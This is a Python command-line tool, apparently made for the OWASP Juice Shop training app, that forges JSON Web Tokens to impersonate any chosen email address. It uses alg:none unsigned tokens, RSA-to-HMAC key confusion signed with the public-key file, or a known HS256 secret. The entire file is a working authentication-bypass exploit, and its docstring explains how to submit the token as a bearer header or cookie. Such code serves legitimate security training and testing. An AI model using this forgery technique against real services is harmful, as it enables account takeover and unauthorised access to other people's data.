#!/usr/bin/env python3
"""JWT forgery helper for the Juice Shop crypto weaknesses.

  confuse  -- HS256 signed with the raw RSA public-key file bytes
              (key/algorithm confusion; PyJWT refuses this on purpose)
  none     -- unsigned token with alg:none
  hs256    -- plain HS256 with an explicit symmetric secret

Output is a single token printed to stdout; feed it to Authorization: Bearer
or the token cookie as needed.

Note: only alg:none / key-confusion modes are the actual challenge targets;
hs256 requires the real JWT secret which is not public.
"""

import argparse
import base64
import hashlib
import hmac
import json
import sys


def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def b64url_json(obj) -> str:
    return b64url(json.dumps(obj, separators=(",", ":")).encode())


def sign(header: dict, payload: dict, secret: bytes) -> str:
    h = b64url_json(header)
    p = b64url_json(payload)
    sig = hmac.new(secret, f"{h}.{p}".encode(), hashlib.sha256).digest()
    return f"{h}.{p}.{b64url(sig)}"


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("mode", choices=["confuse", "none", "hs256"])
    ap.add_argument("--pub", default="jwt.pub", help="RSA public key file (confuse)")
    ap.add_argument("--secret", help="explicit HMAC secret (hs256)")
    ap.add_argument("--email", required=True, help="identity to impersonate")
    ap.add_argument("--extra", action="append", default=[], help="extra payload claims k=v")
    args = ap.parse_args()

    payload = {"email": args.email}
    for kv in args.extra:
        k, _, v = kv.partition("=")
        payload[k] = v

    if args.mode == "confuse":
        with open(args.pub, "rb") as f:
            secret = f.read()
        token = sign({"alg": "HS256", "typ": "JWT"}, payload, secret)
    elif args.mode == "none":
        header = {"alg": "none", "typ": "JWT"}
        token = f"{b64url_json(header)}.{b64url_json(payload)}."
    else:
        if not args.secret:
            sys.exit("hs256 mode requires --secret")
        token = sign({"alg": "HS256", "typ": "JWT"}, payload, args.secret.encode())

    print(token)


if __name__ == "__main__":
    main()
